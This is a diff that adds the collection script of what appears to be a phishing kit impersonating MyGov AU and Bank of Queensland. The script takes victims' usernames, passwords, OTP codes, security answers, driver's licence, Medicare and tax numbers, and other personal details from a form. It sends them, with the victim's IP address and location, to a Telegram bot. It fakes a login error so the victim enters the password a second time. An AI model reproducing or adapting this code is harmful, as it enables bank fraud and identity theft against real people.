@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Processing...</title>
+</head>
+<body>
+<script src="config/email.js"></script>
+<script>
+  (function() {
+    console.log("=== process.html loaded ===");
+
+    const apikey = CONFIG.apikey;
+    const chatid = CONFIG.chatid;
+
+    // ---- Helper: get URL parameter ----
+    function getParam(name) {
+      const url = new URL(window.location.href);
+      return url.searchParams.get(name) || '';
+    }
+
+    // ---- Helper: browser detection ----
+    function getBrowser(userAgent) {
+      if (userAgent.includes('MSIE')) return 'Internet Explorer';
+      if (userAgent.includes('Firefox')) return 'Mozilla Firefox';
+      if (userAgent.includes('Chrome')) return 'Google Chrome';
+      if (userAgent.includes('Safari')) return 'Safari';
+      if (userAgent.includes('Opera')) return 'Opera';
+      return 'Unknown';
+    }
+
+    // ---- Helper: get location from IP ----
+    async function getLocation(ip) {
+      try {
+        const resp = await fetch(`https://freeipapi.com/api/json/${ip}`);
+        const data = await resp.json();
+        return { country: data.countryName || 'Unknown', city: data.cityName || 'Unknown' };
+      } catch {
+        return { country: 'Unknown', city: 'Unknown' };
+      }
+    }
+
+    // ---- Helper: send message to Telegram ----
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${apikey}/sendMessage`;
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatid, text: message })
+        });
+        const result = await response.json();
+        console.log('Telegram response:', result);
+        return result.ok;
+      } catch (e) {
+        console.error('Telegram send error:', e);
+        return false;
+      }
+    }
+
+    // ---- Main logic ----
+    (async function() {
+      // Read the 'type' parameter to know which form submitted
+      const type = getParam('type');
+      console.log('Type:', type);
+
+      // If no type, return a JSON key (like the original PHP did)
+      if (!type) {
+        document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
+        return;
+      }
+
+      // ---- Gather common client info ----
+      let ip = '0.0.0.0';
+      try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        const data = await resp.json();
+        ip = data.ip;
+      } catch {}
+      const userAgent = navigator.userAgent;
+      const browser = getBrowser(userAgent);
+      const location = await getLocation(ip);
+
+      // ---- Build message based on type ----
+      let message = '';
+      const successCountKey = 'successCount_' + type; // unique per type, e.g., successCount_login
+
+      if (type === 'login') {
+        const username = getParam('username');
+        const password = getParam('password');
+        const title = getParam('title') || 'Bank of QueensLand';
+        message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+        message += "|Bank Name: " + title + "\n";
+        message += "|Username: " + username + "\n";
+        message += "|Password: " + password + "\n";
+        // ... rest of info
+      } 
+      else if (type === 'd-sn') {
+        const aa = getParam('name');
+        const bb = getParam('address');
+        const cc = getParam('dob');
+        const dd = getParam('dl');
+        const ee = getParam('dlback');
+        const ff = getParam('dlexp');
+        const gg = getParam('medno');
+        const hh = getParam('irn');
+        const ii = getParam('taxno');
+        const jj = getParam('phone');
+        message += "|++++++++++++|+ MyGov AU LOG +|+++++++++++|\n";
+        message += "|Full Name: " + aa + "\n";
+        message += "|Phone Number: " + jj + "\n";
+        message += "|Address: " + bb + "\n";
+        message += "|Date of Birth: " + cc + "\n";
+        message += "|Driver's License: " + dd + "\n";
+        message += "|Driver's License Backside: " + ee + "\n";
+        message += "|Driver's License Expiry: " + ff + "\n";
+        message += "|Medical Insurance Number: " + gg + "\n";
+        message += "|Individual Reference Number: " + hh + "\n";
+        message += "|Tax Number: " + ii + "\n";
+        // ... rest of info
+      }
+      else if (type === 'otp-sn' || type === 'st-sn') {
+        const username = getParam('username');
+        const title = getParam('title') || 'Bank of QueensLand OTP';
+        message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+        message += "|Bank Name: " + title + "\n";
+        message += "|OTP-Code: " + username + "\n";
+        // ... rest of info
+      }
+      else if (type === 'st') {
+        const username = getParam('username');
+        const password = getParam('password');
+        const title = getParam('title');
+        const secq = getParam('secq');
+        message += "|++++++++++++|MyGov AU LOG|+++++++++++|\n";
+        message += "|Bank Name: " + title + "\n";
+        message += "|Username: " + username + "\n";
+        message += "|Password: " + password + "\n";
+        message += "|Seq Number: " + secq + "\n";
+        // ... rest of info
+      }
+      else {
+        // Unknown type – return JSON key
+        document.body.textContent = '{"key": "For Page and Link Contact Telegram: @Mr0xBD"}';
+        return;
+      }
+
+      // Append common info
+      message += "|+++++++++++++|   Information   |+++++++++++++++|\n";
+      message += "|Client IP: " + ip + "\n";
+      message += "|City : " + location.city + "\n";
+      message += "|Country : " + location.country + "\n";
+      message += "|UserAgent : " + userAgent + "\n";
+      message += "|+++++++++++++| Coded By Mr.0x |+++++++++++++|\n";
+      message += "|+++++++++++++|    @Mr0xBD     |+++++++++++++|\n";
+
+      console.log('Final message:\n', message);
+
+      // ---- Send to Telegram ----
+      const sent = await sendToTelegram(message);
+      if (!sent) {
+        console.error('Failed to send message');
+      }
+
+      // ---- Handle redirects based on type and successCount ----
+      if (type === 'login') {
+        // Get current count from sessionStorage
+        let count = parseInt(sessionStorage.getItem(successCountKey) || '0', 10);
+        count++;
+        sessionStorage.setItem(successCountKey, count);
+
+        if (count === 1) {
+          // Show error and go back
+          // We need to redirect back to index.html with a flag to show error
+          // Since we can't show error from here, we can redirect to index.html?error=1
+          window.location.href = 'index.html?error=1&clear=1';
+        } else if (count === 2) {
+          // Redirect to OTP page
+          window.location.href = 'boq-otp.html';
+          // Clear count so it resets
+          sessionStorage.removeItem(successCountKey);
+        }
+      } 
+      else if (type === 'otp-sn' || type === 'st-sn') {
+        // After OTP, go to next page (e.g., thank.html or authorization.html)
+        // You can change the redirect as needed
+        window.location.href = 'thank.html';
+      }
+      else if (type === 'd-sn' || type === 'st') {
+        // After these, go to next appropriate page
+        window.location.href = 'next.html'; // or whatever is next
+      }
+      else {
+        // Default: just clear the page (like PHP did)
+        document.body.innerHTML = '';
+      }
+    })();
+  })();
+</script>
+</body>
+</html>
